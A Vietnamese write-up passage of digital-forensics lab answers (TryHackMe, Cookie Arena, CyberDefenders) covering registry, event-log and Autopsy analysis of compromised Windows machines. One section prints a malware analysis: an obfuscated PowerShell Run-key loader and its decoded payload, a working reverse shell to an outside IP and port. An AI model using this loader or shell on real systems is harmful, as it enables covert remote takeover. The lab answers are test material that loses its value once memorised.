- Ngoại trừ các built-in account mặc định như `Administrator`, `DefaultAccount`, `Guest`, `WDAGUtilityAccount` thì ta thấy rằng có ba account user khác là `THM-4n6`, `thm-user`, `thm-user2`.

**$\rightarrow$ Đáp án cần điền là `3`.**

##### b) What is the username of the account that has never been logged in?
- Để xác nhận user account có profile trên máy, ta vào địa chỉ `SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\` bằng tool trên. Trong `ProfileList` ta có:
![image](https://hackmd.io/_uploads/SymCczqCex.png)
- Chú ý tại hai mục cuối cùng, tại phần `Value` ta thấy hai giá trị là `C:\Users\THM-4n6` và `C:\Users\thm-user`, điều này có nghĩa là account `thm-user2` không bao giờ đăng nhập vào.
![image](https://hackmd.io/_uploads/Bk-Q0zcAlx.png)
![image](https://hackmd.io/_uploads/ryLN0zcRxg.png)

**$\rightarrow$ Đáp án cần điền là `thm-user2`.**

##### c) What's the password hint for the user `THM-4n6`?
Vào `SAM\Domains\Account\Users\` và dò từng mục, đến mục `000003E9`, `000003EA` và `000003EB` tại phần `Value Name` có `UserPasswordHint`, nhưng ta thấy rằng chỉ có `000003E9` có hint là `c.o.u.n.t`, hai cái còn lại là `n.u.l.l`.
![image](https://hackmd.io/_uploads/B1pyxm5Rex.png)

**$\rightarrow$ Đáp án cần điền là `count`.**

##### d) When was the file `Changelog.txt`'` accessed?
- Vào địa chỉ `NTUSER.DAT\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\` của user `THM-4n6`, ta thấy có các mục sau:
![image](https://hackmd.io/_uploads/BJIplX5Rgx.png)
- Vào mục `.txt`, ta thấy `Target Name` là `Changelog.txt`. Tại phần `Opened On`:
![image](https://hackmd.io/_uploads/rkuV-790eg.png)
**$\rightarrow$ Đáp án cần điền là `2021-11-24 18:18:48`.**

##### e) What is the complete path from where the python 3.8.2 installer was run?
- Vào địa chỉ `NTUSER.DAT\Software\Microsoft\Windows\Currentversion\Explorer\UserAssist\` và dò từng `GUID`, ta thấy rằng tại hai `GUIDE` áp cuối thì phần `Count` có giá trị, còn mấy `Count` khác không có gì:
![image](https://hackmd.io/_uploads/r1l_X79Cxe.png)
- Dò `Count (59)`, tại `Program Name` ta tìm được:
![image](https://hackmd.io/_uploads/rklamXq0ee.png)

**$\rightarrow$ Đáp án cần điền là `Z:\setups\python-3.8.2.exe`.**

##### f) When was the USB device with the friendly name `USB` last connected?
- Để theo vết USB kết nối tới hệ thống khi nào, ta vào địa chỉ `SYSTEM\ControlSet001\Enum\USBSTOR\`, ta thấy có hai `Ven_Prod_Version` sau:
![image](https://hackmd.io/_uploads/SybZHQqRlx.png)
- Dò trong hai mục trên, vào phần `USBSerial#\Properties\{83da6326-97a6-4088-9453-a19231573b29}\0066` (với `0066` là giá trị chỉ thời gian kết nối lần cuối của USB), ta được hai dữ liệu của hai USB là:
![image](https://hackmd.io/_uploads/HyE2B7qRgg.png)
![image](https://hackmd.io/_uploads/S171U7cCxl.png)
- Nhập lần lượt hai thời gian trên để check đáp án, ta thấy rằng USB đầu tiên là USB cần tìm.
**$\rightarrow$ Đáp án cần điền là `2021-11-24 18:40:06`.**

### II. Task 6 - Windows Fundamentals 1:
- *[Link bài lab](https://tryhackme.com/room/windowsfundamentals1xbx) (Mở ở Task 3).*
- Vào Start Menu, gõ `Run`. Từ hộp thoại Run gõ `lusrmgr.msc`.
#### 1. What is the name of the other user account?
![image](https://hackmd.io/_uploads/rJY3sONl-x.png)
**$\rightarrow$ Đáp án cần điền là `tryhackmebilly`.**

#### 2. What groups is this user a member of?
![image](https://hackmd.io/_uploads/B1jg3_VeWe.png)
**$\rightarrow$ Đáp án cần điền là `Remote Desktop Users,Users`.**

#### 3. What built-in account is for guest access to the computer?
![image](https://hackmd.io/_uploads/r1ZN2uNg-g.png)
**$\rightarrow$ Đáp án cần điền là `Guest`.**

#### 4. What is the account description?
![image](https://hackmd.io/_uploads/Sy3hsdEx-l.png)
**$\rightarrow$ Đáp án cần điền là `window$Fun1!`.**

### III. Windows Fundamentals 2:
#### Task 2
- [Link bài lab](https://tryhackme.com/room/windowsfundamentals2x0x)
- Mở System Configuration trong Start Menu.

##### 1. What is the name of the service that lists Systems Internals as the manufacturer?
Tại tab `Service`, tìm `Systems Internals` trong phần `Manufacturer`:
![image](https://hackmd.io/_uploads/SkXSXLwg-x.png)
**$\rightarrow$ Đáp án cần điền là `PsShutdown`.**

##### 2. Whom is the Windows license registered to?
Tại `About Windows` ở tab `Tools`, chọn `Launch:`
![image](https://hackmd.io/_uploads/B1TDEUPe-l.png)
**$\rightarrow$ Đáp án cần điền là `Windows User`.**

##### 3. What is the command for Windows Troubleshooting?
Tại `Windows Troubleshooting` ở tab `Tools`:
![image](https://hackmd.io/_uploads/B1rANLPe-e.png)
**$\rightarrow$ Đáp án cần điền là `C:\Windows\System32\control.exe /name Microsoft.Troubleshooting`.**

##### 4. What command will open the Control Panel? (The answer is  the name of .exe, not the full path)
Tại `System Properties` ở tab `Tools`:
![image](https://hackmd.io/_uploads/BkqVr8Dl-e.png)
**$\rightarrow$ Đáp án cần điền là `control.exe`.**

#### Task 3:
- What is the command to open User Account Control Settings? (The answer is the name of the .exe file, not the full path)
    - Mở System Configuration trong Start Menu. Tại `Change UAC Settings` ở tab `Tools`:
    ![image](https://hackmd.io/_uploads/HJFtuIweZx.png)
    **$\rightarrow$ Đáp án cần điền là `UserAccountControlSettings.exe`.**
    
#### Task 4:
##### 1. What is the command to open Computer Management? (The answer is the name of the .msc file, not the full path)
Mở System Configuration trong Start Menu. Tại `Computer Management` ở tab `Tools`:
![image](https://hackmd.io/_uploads/Bytmuvwebx.png)
**$\rightarrow$ Đáp án cần điền là `compmgmt.msc`.**

##### 2. At what time every day is the GoogleUpdateTaskMachineUA task configured to run?
- Mở Start Menu, tìm `Computer Management`, ở phần `Task Scheduler Library` trong `Task Scheduler`:
![image](https://hackmd.io/_uploads/ryz0umOxZe.png)
- Không thấy gì cả :) Nên bài này ta tham khảo write - up trên mạng:
![image](https://hackmd.io/_uploads/ryP-K7Ox-e.png)
**$\rightarrow$ Đáp án cần điền là `6:15 AM`.**

##### 3. What is the name of the hidden folder that is shared?
Mở Start Menu, tìm `Computer Management`, ở phần `Shares` trong `Shared Folders`, ngoài các Share Names mặc định là `ADMIN$`, `C$`, `IPC$`:
![image](https://hackmd.io/_uploads/rk4gRzuxZl.png)
**$\rightarrow$ Đáp án cần điền là `sh4r3dF0Ld3r`.**

#### Task 5:
##### 1. What is the command to open System Information? (The answer is the name of the .exe file, not the full path)
Mở System Configuration trong Start Menu. Tại `System Information` ở tab `Tools`:
![image](https://hackmd.io/_uploads/SksNO2Fx-l.png)
**$\rightarrow$ Đáp án cần điền là `msinfo32.exe`.**

##### 2. What is listed under System Name?
Mở System Information trong Start Menu. Tại phần `System Name` của `System Summary`:
![image](https://hackmd.io/_uploads/BylyK2tlWl.png)
**$\rightarrow$ Đáp án cần điền là `THM-WINFUN2`.**

##### 3. Under Environment Variables, what is the value for ComSpec?
Mở System Information trong Start Menu. Tại `Environment Variables` trong `Software Environment`, ở phần `ComSpec`:
![image](https://hackmd.io/_uploads/BJ3mj3Flbg.png)
**$\rightarrow$ Đáp án cần điền là `%SystemRoot%\system32\cmd.exe`.**

#### Task 6:
What is the command to open Resource Monitor? (The answer is the name of the .exe file, not the full path)
- Mở System Configuration trong Start Menu. Tại `Resource Monitor` ở tab `Tools`:
![image](https://hackmd.io/_uploads/H1hEgpYlbe.png)
**$\rightarrow$ Đáp án cần điền là `resmon.exe`.**

#### Task 7:
##### 1. In System Configuration, what is the full command for Internet Protocol Configuration?
Mở System Configuration trong Start Menu. Tại `Internet Protocol Configuration` ở tab `Tools`:
![image](https://hackmd.io/_uploads/rkDiSTKeWl.png)
**$\rightarrow$ Đáp án cần điền là `C:\Windows\System32\cmd.exe /k %windir%\system32\ipconfig.exe`.**

##### 2. For the ipconfig command, how do you show detailed information?
Link tham khảo: [An A-Z Index of Windows CMD commands](https://ss64.com/nt/)
![image](https://hackmd.io/_uploads/HJbmUpYlbl.png)
**$\rightarrow$ Đáp án cần điền là `ipconfig /all`.**

#### Task 8:
What is the command to open the Registry Editor? (The answer is the name of  the .exe file, not the full path)
- Mở System Configuration trong Start Menu. Tại `Resource Monitor` ở tab `Tools`:
![image](https://hackmd.io/_uploads/HkuNw1ce-x.png)
**$\rightarrow$ Đáp án cần điền là `regedt32.exe`.**

### IV. Investigating Windows:
[Link bài lab](https://tryhackme.com/room/investigatingwindows)

#### 1. Whats the version and year of the Windows machine?
Vào File Explorer, chuột phải vào `This PC` và chọn `Properties`:
![image](https://hackmd.io/_uploads/B1AJhNieWg.png)
![image](https://hackmd.io/_uploads/SyqGhNjlWg.png)
**$\rightarrow$ Đáp án cần điền là `Windows Server 2016`.**

#### 2. Which user logged in last?
- Từ Start Menu, mở Event Viewer, sau đó vào `Security` của `Windows Logs`:
![image](https://hackmd.io/_uploads/S17ACVil-g.png)
- Ở phía bên phải, chọn `Filter Current Log...` và nhập event ID `4624` (Một tài khoản đã đăng nhập thành công) để lọc các account đã đăng nhập vào máy:
![image](https://hackmd.io/_uploads/By9neBilZx.png)
- Dò dần dần từ trên xuống dưới, ta thấy `Administator`:
![image](https://hackmd.io/_uploads/SkgT-BoxWg.png)

**$\rightarrow$ Đáp án cần điền là `Administrator`.**

#### 3. When did John log onto the system last? 
> *Answer format: MM/DD/YYYY H:MM:SS AM/PM*

Dùng `Find...` và tìm từ khoá `John`:
![image](https://hackmd.io/_uploads/rklsGSjgWg.png)
**$\rightarrow$ Đáp án cần điền là `03/02/2019 5:48:32 PM`.**

#### 4. What IP does the system connect to when it first starts?
Từ Start Menu, mở System Information. Ở phần `Software Environment`, mở `Startup Programs`:
![image](https://hackmd.io/_uploads/Skd9mHigbl.png)
**$\rightarrow$ Đáp án cần điền là `10.34.2.3`.**

#### 5. What two accounts had administrative privileges (other than the Administrator user)?
> *Answer format: List them in alphabetical order*

- Mở User Accounts trong Start Menu:
![image](https://hackmd.io/_uploads/SyRrEHsx-e.png)
- Mở `Manage another account`:
![image](https://hackmd.io/_uploads/SJhdErogWx.png)
Ta chỉ thấy `Administrator` và `Jenny` là có quyền admin, vẫn còn thiếu một account.
- Gõ `lusrmgr.msc` trong hộp thoại Run (`Windows`+`R`). Vào `Groups`>`Administrators` rồi chuột phải:
![image](https://hackmd.io/_uploads/S1EVOSjxbx.png)
- Chọn `Properties`:
![image](https://hackmd.io/_uploads/ryI8drigZx.png)

**$\rightarrow$ Đáp án cần điền là `Guest, Jenny`.**

#### 6. What's the name of the scheduled task that is malicous?
Từ Start Menu vào Computer Management. Tại phần `Task Scheduler Library` trong `Task Scheduler`:
![image](https://hackmd.io/_uploads/B1352Hsl-g.png)
Phần `Description` của `Clean file system` trông hơi lạ lạ lỏ lỏ vì các tasks (của admin) khác hầu như không có ghi gì trong mô tả, trừ `npcapwatchdog` có ghi `Ensure Npcap service is configured to start at boot`.
**$\rightarrow$ Đáp án cần điền là `Clean file system`.**

#### 7. What file was the task trying to run daily?
Vào phần `Actions`:
![image](https://hackmd.io/_uploads/S1rrRrsxWx.png)
**$\rightarrow$ Đáp án cần điền là `nc.ps1`.**

#### 8. What port did this file listen locally for?
![image](https://hackmd.io/_uploads/S1rrRrsxWx.png)
**$\rightarrow$ Đáp án cần điền là `1348`.**

#### 9. When did Jenny last logon?
- Từ Start Menu, mở Event Viewer, sau đó vào `Security` của `Windows Logs`:
![image](https://hackmd.io/_uploads/S17ACVil-g.png)
- Ở phía bên phải, chọn `Filter Current Log...` và nhập event ID `4624` (Một tài khoản đã đăng nhập thành công) để lọc các account đã đăng nhập vào máy:
![image](https://hackmd.io/_uploads/By9neBilZx.png)
- Chọn `Find...` và gõ từ khoá `Jenny`:
![image](https://hackmd.io/_uploads/Bk8LZIieWx.png)
- Vào Commant Prompt với quyền admin, gõ `net user Jenny` để xem chi tiết về account này:
![image](https://hackmd.io/_uploads/BJsNGLoebe.png)

**$\rightarrow$ Đáp án cần điền là `Never`.**

#### 10. At what date did the compromise take place?
> *Answer format: MM/DD/YYYY*

- Trong `Computer Managerment`>`Task Scheduler`>`Task Scheduler Library`>`Clean file system`>`Actions`, có thể thấy địa chỉ chứa file `nc.ps1` là `C:\TMP\`:
![image](https://hackmd.io/_uploads/S1rrRrsxWx.png)
**$\rightarrow$ Đáp án cần điền là `03/02/2019`.**
- Vào `C:\TMP\` trong File Explorer, có thể thấy tất cả đều được tạo cùng một ngày:
![image](https://hackmd.io/_uploads/ByPGYLixWe.png)

**$\rightarrow$ Đáp án cần điền là `03/02/2019`.**

#### 11. During the compromise, at what time did Windows first assign special privileges to a new logon?
> *Answer format: MM/DD/YYYY HH:MM:SS AM/PM*
> Hint:
> ![image](https://hackmd.io/_uploads/SJY7Jwslbe.png)

- Tìm event ID:
![image](https://hackmd.io/_uploads/SJ6bjIog-l.png)
- Lọc những event có ID `4672` trong thời gian `03/02/2019`:
![image](https://hackmd.io/_uploads/BywdnLol-g.png)
- Tìm event có thời gian giống hint, từ dưới lên trên:
![image](https://hackmd.io/_uploads/Syb8ePjxbx.png)

**$\rightarrow$ Đáp án cần điền là `03/02/2019 4:04:49 PM`.**

#### 12. What tool was used to get Windows passwords?
- Vào `C:\TMP\` dò thử các file `.txt`, ở `mim-out`:
![image](https://hackmd.io/_uploads/SJfREL2xWl.png)
- Theo Wikipedia:
![image](https://hackmd.io/_uploads/rJNzSIhl-l.png)
> Ngoài ra có thể kiểm tra bằng cách:
> - Dùng lệnh `get-filehash .\mim.exe | Format-List` trong PowerShell (Administrator) để lấy mã hash:
> ![image](https://hackmd.io/_uploads/HyuoOIngWe.png)
> - Đưa hash đó lên [VIRUSTOTAL](https://www.virustotal.com/gui/home/upload):
> ![image](https://hackmd.io/_uploads/SJLDFL3eZe.png)

**$\rightarrow$ Đáp án cần điền là `Mimikatz`.**

#### 13. What was the attackers external control and command servers IP?
- File `hosts` là file máy tính được sử dụng trong hệ điều hành để ánh xạ tên máy chủ với địa chỉ IP, nằm ở `C:\Windows\System32\drivers\etc`.
- Truy cập tới `hosts` và chọn Notepad để mở:
![image](https://hackmd.io/_uploads/B1Js5L3xZx.png)
- Nội dung file:
![image](https://hackmd.io/_uploads/HkNXoUhx-e.png)
Có thể thấy rằng localhost IP là `127.0.0.1`, và IP lạ là `76.32.97.132`.

**$\rightarrow$ Đáp án cần điền là `76.32.97.132`.**

#### 14. What was the extension name of the shell uploaded via the servers website?
- Thư mục `C:\inetpub` thường được liên kết với IIS (Dịch vụ thông tin Internet) máy chủ web của Microsoft cho phép lưu trữ các trang web và dịch vụ trực tuyến trên máy tính Windows. Thông thường nếu đã cài đặt IIS, thư mục này lưu trữ các tập tin cho trang web, các records và các files cần thiết cho hoạt động của dịch vụ.
- Truy cập `C:\inetpub`, ta thấy thư mục `wwwroot`, tiếp tục truy cập nó:
![image](https://hackmd.io/_uploads/HylZ26LhxWe.png)
Có hai file có định dạng `JSP` và một `GIF`.
- Theo Wikipedia:
![image](https://hackmd.io/_uploads/HkYx083lbx.png)
![image](https://hackmd.io/_uploads/BJuPRI3xbg.png)
- File `GIF` là file ảnh, dùng PowerShell kiểm tra nội dung của hai file `JSP` bằng PowerShell:
![image](https://hackmd.io/_uploads/SymayD2xZg.png)
File `b.jsp` nội dung rất dài nhưng hai file đều chứa code. Đây có thể là extension file cần tìm.

**$\rightarrow$ Đáp án cần điền là `.jsp`.**

#### 15. What was the last port the attacker opened?
- Xem ports đang mở bằng cách check Windows logs. Từ Start Menu mở Windows Firewall with Advanced Securuty và mở `Inbound Rules`:
![image](https://hackmd.io/_uploads/HJyyMvnlbl.png)
- Rule đầu tiên là `Allow outside connection for development`, nó đáng ngờ vì IP lạ ping tới Google. Chuột phải chọn `Properties`, ở `Protocols and Ports`:
![image](https://hackmd.io/_uploads/SkktMwnebl.png)

**$\rightarrow$ Đáp án cần điền là `1337`.**

#### 16. Check for DNS poisoning, what site was targeted?
Vì có IP lạ ping đến Google nên website này sẽ là đối tượng tình nghi.
![image](https://hackmd.io/_uploads/BJ6UQv2g-l.png)
**$\rightarrow$ Đáp án cần điền là `google.com`.**

### V. Disk Analysis & Autopsy
- [Link bài lab](https://tryhackme.com/room/autopsy2ze0)
> *In the attached VM, there is an Autopsy case file and its corresponding disk image. After loading the .aut file, make sure to re-point Autopsy to the disk image file.*
> ![image](https://hackmd.io/_uploads/rk5Xnqae-x.png)
- Mở Autopsy với quyền Administrator trên máy ảo:
![image](https://hackmd.io/_uploads/SyYjeopeZl.png)
- Chọn `Open Case`, rồi đi đến `Case Files` rồi chọn `Tryhackme.aut` và `Open`:
![image](https://hackmd.io/_uploads/S1tWZspxZl.png)
- `Search for missing image` theo chỉ dẫn của lab.

#### 1. What is the MD5 hash of the E01 image?
Sau khi `Search for missing image` và `Open`, bấm vào `HASAN2.E01` rồi chọn `File Metadata` ở dưới:
![image](https://hackmd.io/_uploads/HkAEMipxWl.png)
**$\rightarrow$ Đáp án cần điền là `3f08c518adb3b5c1359849657a9b2079`.**

#### 2. What is the computer account name?
Chọn `Operating System Information` ở phía bên trái:
![image](https://hackmd.io/_uploads/H16XXopeZx.png)
**$\rightarrow$ Đáp án cần điền là `DESKTOP-0R59DJ3`.**

#### 3. List all the user accounts.
> *Alphabetical order*

Chọn `Operating System User Account` ở phía bên trái, trừ các account mặc định (`Administrator`, `Guest`, `DefaultAccount`, `WDAGUtibilityAccount`, `systemprofile`, `LocalService`, `NetworkService`):
![image](https://hackmd.io/_uploads/r1kvNsTgZx.png)
**$\rightarrow$ Đáp án cần điền là `H4S4N,joshwa,keshav,sandhya,shreya,sivapriya,srini,suba`.**

#### 4. Who was the last user to log into the computer?
Ở cột `Data Accesed`, tìm thời gian truy cập mới nhất:
![image](https://hackmd.io/_uploads/r1kvNsTgZx.png)
**$\rightarrow$ Đáp án cần điền là `sivapriya`.**

#### 5. What was the IP address of the computer?
> *The investigator uses Autopsy to locate the IP address and MAC address of the system by analyzing program files and searching for network-related information. These details are found in log files related to the LAN network.*
- Ở bên trái vào `Data Source`, lần theo địa chỉ `img_HASAN2.E01/vol_vol3/Program Files (x86)/Look@LAN/`:
![image](https://hackmd.io/_uploads/HJI-dipebl.png)
- Ở file `irunin.ini`, tại thẻ `Text` có thông số `%LANIP=192.168.130.216`:
![image](https://hackmd.io/_uploads/SyyhdsTxbx.png)
**$\rightarrow$ Đáp án cần điền là `192.168.130.216`.**

#### 6. What was the MAC address of the computer?
> - *Answer format: XX-XX-XX-XX-XX-XX*
> - *Hint:*
> ![image](https://hackmd.io/_uploads/HJ0pKj6xZg.png)

Ở file `irunin.ini`, tại thẻ `Text` có thông số `%LANNIC=0800272cc4b9`:
![image](https://hackmd.io/_uploads/SyyhdsTxbx.png)
**$\rightarrow$ Đáp án cần điền là `08-00-27-2c-c4-b9`.**

#### 7. What is the name of the network card on this computer?
> *The analysis proceeds to identify the network cards on the system by exploring the software registry entries. Information about installed network adapters is retrieved from the registry, including their service names and descriptions.*

- Chọn `Operating System Information` ở phía bên trái:
![image](https://hackmd.io/_uploads/H16XXopeZx.png)
- Nháy đúp chuột vào `SOFTWARE` để đi đến file `ROOT` của nó. Ở thẻ `Application`, lần theo `ROOT/Microsoft/Windows NT/CurrentVersion/NetworkCards/2/` và xem phần `Description`:
![image](https://hackmd.io/_uploads/Hyn5y3TeZe.png)

**$\rightarrow$ Đáp án cần điền là `Intel(R) PRO/1000 MT Desktop Adapter`.**

#### 8. What is the name of the network monitoring tool?
- Vào phần `Installed Program` phía bên trái, chú ý thấy có phần mềm:
![image](https://hackmd.io/_uploads/SJ1Pgnag-e.png)
- Search Google:
![image](https://hackmd.io/_uploads/rk6FehTlbg.png)

**$\rightarrow$ Đáp án cần điền là `Look@LAN`.**

#### 9. A user bookmarked a Google Maps location. What are the coordinates of the location?
Ở phần `Web Bookmarks`, tìm URL có liên quan tới Google Maps:
![image](https://hackmd.io/_uploads/rklVW36g-x.png)
**$\rightarrow$ Đáp án cần điền là `12°52'23.0"N 80°13'25.0"E`.**

#### 10. A user has his full name printed on his desktop wallpaper. What is the user's full name?
- Vào phần `Images/Videos` phía trên thanh công cụ và mò từng user trong `/img_HASAN2.E01/vol_vol3/Users/`:
![image](https://hackmd.io/_uploads/HkSnS3Te-g.png)
- Ở phần ảnh của `joshwa` có dòng chữ ở phía góc trái trên nên ta chuột phải và chọn `Show content viewer` rồi chỉnh kích thước lên `150%`:
![image](https://hackmd.io/_uploads/HkaMw3axWx.png)

**$\rightarrow$ Đáp án cần điền là `Anto Joshwa`.**

#### 11. A user had a file on her desktop. It had a flag but she changed the flag using PowerShell. What was the first flag?
Dò từng `ConsoleHost_history.txt` của từng user trong `/img_HASAN2.E01/vol_vol3/Users/[username]/AppData/RoamingMicrosoft/Windows/PowerShell/PSReadLine/`, ở phần của `shreya`:
![image](https://hackmd.io/_uploads/BykgFhagZx.png)
**$\rightarrow$ Đáp án cần điền là `flag{HarleyQuinnForQueen}`.**

#### 12. The same user found an exploit to escalate privileges on the computer. What was the message to the device owner?
Trong `/img_HASAN2.E01/vol_vol3/Users/shreya/` có file `exploit.ps1`:
![image](https://hackmd.io/_uploads/HkMqSeJbbx.png)
**$\rightarrow$ Đáp án cần điền là `Flag{I-hacked-you}`.**

#### 13. Two hack tools focused on passwords were found in the system. What are the names of these tools?
> - *Alphabetical order*
> - *Hint:*
> ![image](https://hackmd.io/_uploads/S1htOg1--g.png)

- Trong `img_HASAN2.E01/vol_vol3/ProgramData/Microsoft/Windows Defender/Scans/History/Service/DetectionHistory` có rất nhiều folders:
![image](https://hackmd.io/_uploads/BJguDeJbWl.png)
- Dò từng folder, ở `02`:
![image](https://hackmd.io/_uploads/BydgugkbWx.png)
![image](https://hackmd.io/_uploads/ryVGOxyWZl.png)
![image](https://hackmd.io/_uploads/HJ_7_xyZWx.png)
**$\rightarrow$ Đáp án cần điền là `Lazagne,Mimikatz`.**

#### 14. There is a YARA file on the computer. Inspect the file. What is the name of the author?
- Tìm trong `/img_HASAN2.E01/vol_vol3/Users/[username]/Downloads/`, của user `H4S4N` có `mimikatz_trunk.zip`. Check file `.zip` có file `.yar`:
![image](https://hackmd.io/_uploads/BkEVqgkWWx.png)
- Check file `.yar`:
![image](https://hackmd.io/_uploads/H1qpclJ-We.png)
**$\rightarrow$ Đáp án cần điền là `Benjamin DELPY (gentilkiwi)`.**

#### 15. One of the users wanted to exploit a domain controller with an MS-NRPC based exploit. What is the filename of the archive that you found?
> *Include the spaces in your answer*

- MS-NRPC (Microsoft Netlogon Remote Protocol) là giao thức Microsoft dùng cho Domain Controller. Nó được dùng để:
    - Xác thực máy tính domain (machine authentication).
    - Thiết lập secure channel giữa workstation $\leftrightarrow$ domain controller.
    - Kiểm soát tài khoản máy tính.
    - Được sử dụng nhiều trong quá trình logon và replication
$\rightarrow$ Đây là giao thức liên quan trực tiếp đến lỗ hổng nổi tiếng Zerologon (CVE-2020-1472) – một exploit dùng MS-NRPC để lấy quyền Domain Admin chỉ bằng vài gói tin đặc biệt.
- User trong challenge đã lưu một file liên quan đến MS-NRPC.
- Dò trong từng `/img_HASAN2.E01/vol_vol3/Users/[username]/AppData/RoamingMicrosoft/Windows/Recent`:
![image](https://hackmd.io/_uploads/H1eNxbJWZe.png)
**$\rightarrow$ Đáp án cần điền là `2.2.0 20200918 Zerologon encrypted.zip`.**

## C. Cookie Arena:
### I. Sổ đăng ký:
> [Link bài lab](https://battle.cookiearena.org/challenges/digital-forensics/so-dang-ky)
> - *Hòa thấy hiện tượng lạ mỗi khi anh ta khởi động máy tính. Anh ta nghĩ rằng việc tải các video không lành mạnh gần đây đã khiến máy tính của anh ta bị hack.*
> - [Link challenge](https://drive.google.com/file/d/1pShye_YtnUuIObPdnq9PeiIge0Oelsix/view?usp=drive_link), password: `cookiehanhoan`
> - Format Flag: `CHH{XXX}`

- Challenge cho một file `NTUSER.DAT` nên ta sẽ dùng tool Registry Explorer của Eric Zimmerman để phân tích.
- Khi khởi động máy tính có hiện tượng lạ, nghĩa là có gì đó tự khởi chạy nên ta sẽ kiểm tra `Software\Microsoft\Windows\CurrentVersion\Run`:
![image](https://hackmd.io/_uploads/ryB3yql-bx.png)
    - **Value name** là `Updater` trông giả giả, ngoài ra **Value** rất dài:
    ```
    "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "(neW-obJEct io.COMprEssIon.dEFlATesTReAm( [sySTem.IO.memorYSTREam] [coNVeRT]::FRoMBAse64stRInG( 'TVFva4JAGP8qh7hxx/IwzbaSBZtsKwiLGexFhJg+pMs09AmL6rvP03S9uoe739/nZD+OIEHySmwolNn6F3wkzilH2HEbkDupvwXM+cKaWxWSSt2Bxrv9F64ZOteepU5vYOjMlHPMwNuVQnItyb8AneqOMnO5PiEsVytZnHkJUjnvG4ZuXB7O6tUswigGSuVI0Gsh/g1eQGt8h6gdUo98CskGQ8aIkgBR2dmUAw+9kkfvCiiL0x5sbwdNlQUckb851mTykfhpECUbdstXjo2LMIlEE0iCtedvhWgER1I7aKPHLrmQ2QGVmkbuoFoVvOE9Eckaj8+26vbcTeomqptjL3OLUM/0q1Q+030RMD73MBTYEZFuSmUMYbpEERduSVfDYZW8SvwuktJ/33bx/CeLEGirU7Zp52ZpLfYzPuQhZVez+SsrTnOg7A8='), [SYSTEM.iO.ComPReSSion.CoMPrEsSIonmODe]::DeCOmpresS)|FOREAcH-object{ neW-obJEct io.streAMrEadeR( $_,[sysTem.TExt.EnCoDING]::asCIi )}).reaDToEnD()|inVOKe-exprEsSIon"
    ```
    - Đưa **Value** trên lên Gemini Pro và nhờ nó giải thích ý nghĩa:
        - `[cONVeRT]::FROmBAse64stRINg(...)`: Giải mã một chuỗi Base64 (chuỗi ký tự lộn xộn dài nhất trong ảnh).
        - `IO.COmpREssion.dEfIATEsTReAm(..., [SYSTEM.iO.ComPReSSion.ComPreSSIonmODe]::DeCOmpress)`: Giải nén dữ liệu vừa giải mã bằng thuật toán Deflate.
        - `reADToEND()|inVOke-exPREssion`: Đọc kết quả cuối cùng và thực thi (đây chính là hành vi của mã độc).
> Thông tin về Fileless Malware (Mã độc không tập tin) trong challenge:
> - Hành vi: Không tạo ra file `.exe` hay `.dll` độc hại trên ổ cứng (giúp qua mặt phần mềm quét virus) mà giấu toàn bộ mã nguồn độc hại vào Registry của Windows và chạy trực tiếp trên RAM qua PowerShell.
> - Quy trình hoạt động:
>    - Windows đọc key `Software\Microsoft\Windows\CurrentVersion\Run` và thấy giá trị `Updater`, Windows nghĩ đây là chương trình cập nhật hệ thống nên cho phép nó chạy.
>    - Command gọi `powershell.exe -windowstyle hidden`, để ẩn cửa sổ đen, để user không biết nó đang chạy.
>    - Lấy chuỗi Base64 bắt đầu bằng `TVFva...`.
>    - `[cONVeRT]::FROmBAse64stRINg`: Chuyển chuỗi này về dạng byte.
>    - `IO.COmpREssion.dEfIATEsTReAm`: Giải nén dữ liệu này, trong challenge attacker đã nén code lại để tiết kiệm chỗ và làm khó việc đọc hiểu).
>    - `inVOke-exPREssion`: Viết tắt là IEX, là lệnh nguy hiểm nhất. Nó lấy kết quả vừa giải nén (đoạn code PowerShell) và chạy nó.
- Tách chuỗi Base64 ra và giải mã nó:
```py
import base64
import zlib

b64_string = "TVFva4JAGP8qh7hxx/IwzbaSBZtsKwiLGexFhJg+pMs09AmL6rvP03S9uoe739/nZD+OIEHySmwolNn6F3wkzilH2HEbkDupvwXM+cKaWxWSSt2Bxrv9F64ZOteepU5vYOjMlHPMwNuVQnItyb8AneqOMnO5PiEsVytZnHkJUjnvG4ZuXB7O6tUswigGSuVI0Gsh/g1eQGt8h6gdUo98CskGQ8aIkgBR2dmUAw+9kkfvCiiL0x5sbwdNlQUckb851mTykfhpECUbdstXjo2LMIlEE0iCtedvhWgER1I7aKPHLrmQ2QGVmkbuoFoVvOE9Eckaj8+26vbcTeomqptjL3OLUM/0q1Q+030RMD73MBTYEZFuSmUMYbpEERduSVfDYZW8SvwuktJ/33bx/CeLEGirU7Zp52ZpLfYzPuQhZVez+SsrTnOg7A8="

# 1. Giải mã Base64
compressed_data = base64.b64decode(b64_string)
    
# 2. Giải nén (Deflate)
# wbits=-zlib.MAX_WBITS để xử lý Raw Deflate (không có header) thường dùng trong PowerShell
decoded_script = zlib.decompress(compressed_data, -zlib.MAX_WBITS)
print(decoded_script.decode('utf-8'))
```
Output:
```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.253.27",4953);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "CHH{N0_4_go_n0_st4r_wh3r3}" + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
**$\rightarrow$ Flag: `CHH{N0_4_go_n0_st4r_wh3r3}`**

### II. 

## D. CyberDefenders:
### HireMe Lab:
> - [Link bài lab](https://cyberdefenders.org/blueteam-ctf-challenges/hireme/)
> - Đề cho file `.zip` chứa `.ad1` và `.txt` của nó nên ta dùng FTK Imager để phân tích. Vào `File`>`Add Evidence Item...`>`Image File`>`Next >`>`Browser`, chọn `.ad1` và `Finish`.

#### 1. What is the administrator's username?
Ở `User`:
![image](https://hackmd.io/_uploads/rJwxrYNb-g.png)
**$\rightarrow$ Đáp án cần điền là `Karen`.**

#### 2. What is the OS's build number?
- Vào `Windows\System32\config` và export `SOFTWARE`:
